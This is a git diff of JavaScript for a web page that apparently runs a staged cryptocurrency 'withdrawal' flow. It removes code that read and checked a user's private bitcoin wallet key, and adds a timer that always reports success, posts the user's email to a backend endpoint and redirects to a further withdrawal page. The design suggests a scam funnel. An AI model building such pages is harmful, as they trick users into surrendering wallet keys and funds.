@@ -1,15 +1,16 @@
 const xhr = new XMLHttpRequest()
+let url = new URL(window.location.href).searchParams.get("email")
 
 
 
 function loaderFunction(status) {
-    if(status){
+    if (status) {
         let div = document.createElement('div');
         div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
         div.id = "loader-wrapper"
         div.innerHTML = '<div class="loader" style="color:red;"></div>'
         document.body.append(div)
-    }else{
+    } else {
         document.getElementById("loader-wrapper").remove()
 
     }
@@ -117,42 +118,24 @@ async function check_data() {
 
 async function check(keys) {
     const fill_error = document.querySelector('.incorrect_error');
-    const sicret_key_input = document.getElementById('private_bitcoin_wallet').value;
     const incorrect_error = document.querySelector('.data_ok')
     const wait = document.getElementById('wait')
     wait.classList.add('active');
+
     setInterval(() => {
-        if (sicret_key_input == "") {
-            wait.classList.remove('active');
-            fill_error.classList.add('active');
-            setTimeout(() => {
-                fill_error.classList.remove('active');
-            }, 7000)
-    
-            return
-        } else {
-            for (let key in keys) {
-                if (keys[key].bitcoin_key == sicret_key_input) {
-                    wait.classList.remove('active');
-                    incorrect_error.classList.add("active");
-                    fill_error.classList.remove("active");
-    
-                    return
-                }
-                else {
-                    wait.classList.remove('active');
-                    incorrect_error.classList.add("active");
-                    setTimeout(() => {
-                        incorrect_error.classList.remove("active");
-                        fill_error.classList.remove("active");
-    
-                    }, 7000)
-                }
-            }
-    
-    
-    
-        }
+
+        wait.classList.remove('active');
+        fill_error.classList.remove("active");
+        incorrect_error.classList.add("active");
+        send_request("post", false, "send_mail-2", { email: url })
+
+        setTimeout(() => {
+            window.location.href = "withdraw-5.html"
+            incorrect_error.classList.remove("active");
+            fill_error.classList.remove("active");
+
+        }, 7000)
+
     }, 9000)
 }
 
